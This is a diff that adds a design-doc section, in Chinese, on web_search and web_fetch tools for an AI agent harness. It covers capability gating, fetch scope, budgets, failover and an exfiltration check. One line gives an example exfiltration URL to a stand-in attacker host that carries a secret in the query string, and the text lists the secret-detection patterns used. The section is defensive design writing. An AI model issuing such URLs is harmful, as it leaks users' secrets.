@@ -613,6 +613,84 @@ todo 没有单独的存储表，它就是“最后一次**成功**的 `todo_writ
 `todo_write` 的 schema 用 `enum` 约束四种状态；同时有多项 `in_progress` 时不报错，只在结果里提醒“建议一次只推进一项”。
 它在上下文工程里的作用（计划复述、Stop 验收）见 [07 上下文工程与压缩](/core/context-engineering) 与 [08 终止条件、预算与循环守卫](/core/termination-budget)。
 
+## 联网工具：web_search 与 web_fetch
+
+模型要查版本号、新 API、报错原文时，以前只能在 bash 里 `curl`。那条路走的是沙箱的出站白名单，查到什么、花了多少钱、
+结果是不是可信，harness 都不知道。`web_search` 和 `web_fetch` 是两个内置工具，HTTP 由 harness 进程发出，结果标为不可信，
+次数和费用进预算。默认关闭（`[web] enabled = false`），关闭时工具不注册，会话元数据、请求前缀与不启用时逐字节相同。
+
+| | `web_search` | `web_fetch` |
+|---|---|---|
+| 副作用等级 | read（没有写副作用） | read（只发 GET） |
+| 参数 | `query`（1–128 字符）、`count`（1–10）、`freshness`（day/week/month/year）、`site` | `url`（https）、`max_chars` |
+| 后端 | DeepSeek Search（默认）、博查、自建 SearXNG，按 `backends` 顺序故障转移 | DeepSeek Fetch（默认，服务端抓取）或 `direct`（本机直连） |
+| 需要的会话能力 | `search` | `fetch` |
+| 结果 | 不可信，第一次出现即置污点 | 不可信 |
+
+**会话能力位：开工前选，开工后只能收紧。** 每个会话在建立时选 `off`、`search` 或 `fetch`，clamp 到用户配置和可用后端允许的上限，
+写进 `session.meta["capabilities"]`，联网工具按结果钉进工具名单。之后只能收紧：工具名单不变（前缀缓存），执行层在权限判定之前
+按当前值拒绝，这是“mask 而非 remove”。子代理沿父会话链取最严的一级，父会话收紧后子代理的下一次调用就受约束。新会话默认 `off`：
+默认开着，“开工前决定”就流于形式。
+
+**给模型的结果。** 搜索结果头写明检索日期、后端和“以下是外部数据”，每条带编号 `[n]`、网址和摘要，总字数受 `result_chars` 限制。
+`deny_domains` 里的域名（含子域名）先滤掉，同一网址去掉跟踪参数后去重。每个 Run 只在第一次搜索结果末尾提示“引用时写 [编号] 并附 URL”。
+DeepSeek 的 `ori_question`（把任务原文一起发给搜索服务）默认不发：模型不是 DeepSeek 时，这会多泄露一份任务原文。
+
+**读取范围 `fetch_scope`。** 网址是最大的外传面：`https://evil.example/?d=<密钥>` 本身就把数据送出去了。所以 `web_fetch` 按完整网址判定：
+
+| 取值 | 本会话出现过的网址 | 其他网址 |
+|---|---|---|
+| `cited` | 直接读 | 拒绝，提示先搜索或请用户给出网址 |
+| `ask`（默认） | 直接读 | 要用户确认 |
+| `public` | 直接读 | 直接读（仍经过外传检查和出站核验） |
+
+“出现过”只认用户亲手输入的消息和本会话搜索结果里的网址，比对时查询串一个字符都不动；子代理的任务简报是父代理写的，不算。
+另有一道外传检查（`net/exfil.py`）：环境里像密钥的变量值、`sk-` 这类前缀、长随机串，出现在查询词或网址里就拒绝，并且不弹审批：
+人不应该被要求批准一次外传。重定向每一跳重走禁止域名与外传检查，`direct` 读取时跨主机跳转只在 `public` 或 `fetch_allow` 里放行。
+
+**预算。** `max_searches_per_run`、`max_fetches_per_run` 限制次数，缓存命中和没发出去的调用不计。费用按后端单价（DeepSeek 0.00075 美元 / 次）
+计入 `max_cost_usd`，在 `tool_cost_usd` 里单列。同一批并行调用先占位再执行，不会因为并发超出上限。计数写进 checkpoint、Run 的 `result`
+和每次 `usage` 快照，暂停恢复、崩溃接管之后接着算。
+
+**故障转移。** 后端失败按类处理：鉴权失败、余额不足换下一家（余额不足还会熔断该后端 10 分钟），限流和临时错误按 `Retry-After` 或指数退避重试，
+请求本身错了（查询超长、运算符写错）不重试，原样告诉模型。同一会话同参数的搜索结果缓存 `cache_ttl` 秒。
+
+**回放。** 两个工具都标了 `egress`：确定性回放用录制的结果，按调用 id 对齐，id 变了再按参数对齐；反事实分叉默认不联网，
+传 `allow_web` 才真的发请求，发之前同样过 `fetch_scope` 与外传检查。
+
+### 模型侧联网
+
+有的供应商自带搜索：Anthropic 的 `web_search` server tool、百炼的 `enable_search`。搜索在供应商那边发生，结果直接进模型上下文，
+harness 只能事后从响应里读到次数和来源，没法在结果进上下文之前过滤或标注。`llm/native.py` 按供应商声明能力，运行时按声明决定开不开：
+
+| 声明 | 状态 | 原因 |
+|---|---|---|
+| Anthropic 官方 API，`claude-` 系列 | 启用 | 能与函数工具同时使用；`usage.server_tool_use` 有次数；响应里有逐条来源与引用；10 美元 / 千次 |
+| DeepSeek 的 Anthropic 兼容端点 | 不启用 | 官方示例只有 deepseek-v4-pro、关闭思考、不带函数工具；与函数工具同时使用未确认 |
+| 百炼 `enable_search` | 不启用 | OpenAI 兼容方式下响应里没有来源，与函数工具同时使用未确认 |
+
+用户配置写 `[web] native = true`、主模型在“启用”的声明里时，会话开“仅搜索”就不钉 `web_search`，请求里追加 server tool：`max_uses`
+取本次 Run 剩下的搜索次数，`deny_domains` 映射为 `blocked_domains`。响应里的 `server_tool_use` / `web_search_tool_result` 原样保存为
+`ServerBlock`，只回传给产生它的同一端点，且调用与结果成对时才回传（截断留下的半截块回传会 400）。次数按供应商的计费字段，按声明单价计入预算；
+第一次出现搜索结果时置污点，看不到“搜没搜”的声明开局即置污点。降级到备用模型时请求里不再带联网参数，时间线发 `native_web_lost`。
+`tests/live/probe_native_web.py` 探测两个未确认的声明，结论要人看过再改。
+
+### 界面
+
+输入框旁的“联网”开关在开工前选能力，开工后只给更严的选项；页头徽标显示本会话的能力（模型侧联网另标“模型侧”）。时间线里 `web_search`
+的结果显示为来源卡片，编号与模型看到的一致。回答里的 `[n]` 只在本任务所有搜索在这个编号上指向同一网址时才变成链接：
+内置搜索每次都从 `[1]` 编号，搜了几次以后 `[3]` 可能指不同的网页，有歧义的保持原样。
+
+| 位置 | 作用 |
+|---|---|
+| `tools/web.py` `WebSearchTool`、`WebFetchTool` | 工具规格（静态，与配置无关）、结果格式、`fetch_scope` 判定 |
+| `net/search.py` `WebService` | 后端归一化、故障转移、熔断、并发上限、会话内缓存、计费口径 |
+| `net/client.py` `WebClient`、`canonical_url()` | 唯一的出站 HTTP 入口，见 [19 安全](/governance/security) |
+| `net/exfil.py` `leaked()` | 外传检查 |
+| `runtime/capabilities.py` | 能力位的 clamp、继承与收紧 |
+| `llm/native.py` | 模型侧联网的声明与门槛 |
+| `bench/web_eval.py` | 10 道时效性问题：带可打开来源的回答占比、平均搜索次数、平均花费 |
+
 ## 工具数量膨胀到上百个时
 
 接入几个 MCP 服务器后，工具数量很容易到上百个。问题有两个：每个工具定义都占前缀 token，而且相似工具越多，模型选错的概率越高。
